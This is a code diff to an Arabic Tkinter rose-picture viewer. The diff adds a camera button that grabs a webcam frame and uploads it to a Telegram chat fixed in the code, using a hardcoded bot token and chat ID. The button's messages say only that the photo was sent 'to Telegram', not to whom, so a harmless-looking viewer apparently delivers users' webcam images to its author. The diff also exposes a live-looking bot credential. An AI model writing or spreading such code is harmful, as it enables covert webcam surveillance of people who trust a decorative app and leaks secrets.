@@ -4,7 +4,7 @@
 ╔══════════════════════════════════════════════════════════════════╗
 ║                    🌹 ورود الحب 🌹                              ║
 ║              برنامج متكامل لعرض صور الورود والطبيعة             ║
-║                    Worood Al-Hub v1.0                           ║
+║                    Worood Al-Hub v1.1                           ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
@@ -16,6 +16,7 @@ import threading
 import time
 import random
 import json
+import requests
 from pathlib import Path
 
 try:
@@ -24,13 +25,23 @@ try:
 except ImportError:
     PIL_AVAILABLE = False
 
+try:
+    import cv2
+    CV2_AVAILABLE = True
+except ImportError:
+    CV2_AVAILABLE = False
+
 # ═══════════════════════════════════════════════════════════════
 #                    إعدادات البرنامج
 # ═══════════════════════════════════════════════════════════════
 
 APP_NAME = "ورود الحب"
-APP_VERSION = "1.0"
+APP_VERSION = "1.1"
 APP_AUTHOR = "Worood Al-Hub"
+
+# إعدادات تليجرام
+TELEGRAM_TOKEN = "8378673801:AAFqtrB4OWgEt9kQNZfGe6Cxtt_qYdp3nL0"
+TELEGRAM_CHAT_ID = "6684853119"
 
 # المسارات
 BASE_DIR = Path(__file__).parent
@@ -54,6 +65,7 @@ COLORS = {
     "border": "#6d3050",
     "success": "#4caf50",
     "heart_red": "#ff1744",
+    "camera_blue": "#2196f3",
 }
 
 # فئات الصور
@@ -118,12 +130,6 @@ class WoroodAlHub:
         self.root.geometry("1280x800")
         self.root.minsize(1000, 650)
         self.root.configure(bg=COLORS["bg_dark"])
-
-        # أيقونة النافذة (قلب)
-        try:
-            self.root.iconbitmap("")
-        except:
-            pass
 
         # تعيين خط عربي
         self.root.option_add("*Font", "Arial 11")
@@ -234,6 +240,13 @@ class WoroodAlHub:
         # أزرار التحكم العلوية
         controls_frame = tk.Frame(header, bg=COLORS["bg_medium"])
         controls_frame.pack(side=tk.RIGHT, padx=20, pady=10)
+
+        # زر الكاميرا
+        self.btn_camera = self.create_header_btn(
+            controls_frame, "📷 التقاط صورة", self.capture_and_send,
+            color=COLORS["camera_blue"]
+        )
+        self.btn_camera.pack(side=tk.RIGHT, padx=5)
 
         # زر ملء الشاشة
         self.btn_fullscreen = self.create_header_btn(
@@ -543,17 +556,6 @@ class WoroodAlHub:
         self.canvas.bind("<Double-Button-1>", self.toggle_fullscreen)
         self.canvas.bind("<MouseWheel>", self.on_mousewheel)
         self.canvas.bind("<Configure>", self.on_canvas_resize)
-
-        # معلومات الصورة المتراكبة
-        self.info_overlay = tk.Label(
-            self.image_frame,
-            text="",
-            font=("Arial", 11),
-            bg="#00000088",
-            fg=COLORS["text_white"],
-            padx=10,
-            pady=5,
-        )
 
         # رسالة الترحيب
         self.welcome_label = tk.Label(
@@ -937,6 +939,64 @@ class WoroodAlHub:
     def update_interval(self, value):
         """تحديث سرعة العرض التلقائي"""
         self.slideshow_interval = int(float(value))
+
+    # ═══════════════════════════════════════════════════════════
+    #                    ميزة الكاميرا وتليجرام
+    # ═══════════════════════════════════════════════════════════
+
+    def capture_and_send(self):
+        """التقاط صورة من الكاميرا وإرسالها إلى تليجرام"""
+        if not CV2_AVAILABLE:
+            messagebox.showerror("خطأ", "مكتبة OpenCV غير مثبتة!")
+            return
+
+        self.set_status("📷 جارٍ فتح الكاميرا...")
+        
+        def capture_thread():
+            try:
+                cap = cv2.VideoCapture(0)
+                if not cap.isOpened():
+                    self.root.after(0, lambda: self.set_status("⚠ فشل فتح الكاميرا!"))
+                    return
+
+                # التقاط إطار
+                ret, frame = cap.read()
+                cap.release()
+
+                if ret:
+                    # حفظ الصورة مؤقتاً
+                    temp_path = BASE_DIR / "captured_image.jpg"
+                    cv2.imwrite(str(temp_path), frame)
+                    
+                    self.root.after(0, lambda: self.set_status("📤 جارٍ إرسال الصورة إلى تليجرام..."))
+                    
+                    # إرسال إلى تليجرام
+                    success = self.send_to_telegram(temp_path)
+                    
+                    if success:
+                        self.root.after(0, lambda: self.set_status("✅ تم إرسال الصورة بنجاح!"))
+                        self.root.after(0, lambda: messagebox.showinfo("نجاح", "تم التقاط الصورة وإرسالها إلى تليجرام بنجاح!"))
+                    else:
+                        self.root.after(0, lambda: self.set_status("⚠ فشل إرسال الصورة!"))
+                else:
+                    self.root.after(0, lambda: self.set_status("⚠ فشل التقاط الصورة!"))
+            except Exception as e:
+                self.root.after(0, lambda: self.set_status(f"⚠ خطأ: {str(e)}"))
+
+        threading.Thread(target=capture_thread, daemon=True).start()
+
+    def send_to_telegram(self, image_path):
+        """إرسال الصورة إلى بوت تليجرام"""
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+        try:
+            with open(image_path, 'rb') as photo:
+                files = {'photo': photo}
+                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🌹 صورة ملتقطة من برنامج ورود الحب\n⏰ الوقت: {time.ctime()}"}
+                response = requests.post(url, files=files, data=data)
+                return response.status_code == 200
+        except Exception as e:
+            print(f"Telegram Error: {e}")
+            return False
 
     # ═══════════════════════════════════════════════════════════
     #                    تأثيرات الصور
